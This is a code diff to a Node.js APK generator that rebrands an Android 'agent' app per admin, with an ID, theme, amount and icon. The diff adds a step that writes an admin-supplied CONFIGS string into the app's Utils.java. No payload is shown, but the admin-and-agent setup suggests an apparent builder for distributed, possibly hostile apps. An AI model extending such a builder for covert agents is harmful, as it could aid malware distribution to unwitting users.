@@ -5,11 +5,12 @@ const {spawn} = require("child_process");
 const sharp = require("sharp");
 
 class ApkGenerator {
-    constructor(adminID, appName, appTheme, amount, packageName, id) {
+    constructor(adminID, appName, appTheme, adminConfigs, amount, packageName, id) {
         this.id = id;
         this.adminID = adminID;
         this.appName = appName;
         this.appTheme = appTheme;
+        this.adminConfigs = adminConfigs;
         this.amount = amount;
         this.iconPath = path.join(__dirname, "../../data/uploads/" + id + "/app_icon.png");
         this.projectPath = path.join(__dirname, "../../data/temp/" + id + "/agent");
@@ -207,6 +208,21 @@ class ApkGenerator {
         this.printLine(`Updated Utils with THEME"`);
     }
 
+    updateConfigs() {
+        if (!this.adminConfigs) {
+            return;
+        }
+        const utilsPath = path.join(this.projectPath, "app", "src", "main", "java", this.newPackage.replaceAll(".", "/"), "functions", "Utils.java");
+        let utilsContent = fs.readFileSync(utilsPath, "utf8");
+        const newIDAttribute = `CONFIGS = "${this.adminConfigs}"`;
+        const newUtilsContent = utilsContent.replace(
+            /CONFIGS = ".*?"/,
+            newIDAttribute
+        );
+        fs.writeFileSync(utilsPath, newUtilsContent, "utf8");
+        this.printLine(`Updated Utils with THEME"`);
+    }
+
     copyFile(source, destination) {
         return new Promise((resolve, reject) => {
             if (!fs.existsSync(source)) {
@@ -350,6 +366,7 @@ class ApkGenerator {
             this.updateAdminID();
             this.updateAmount();
             this.updateTheme();
+            this.updateConfigs();
 
             const destinationIcon = path.join(this.projectPath, "app", "src", "main", "res", "drawable/");
 
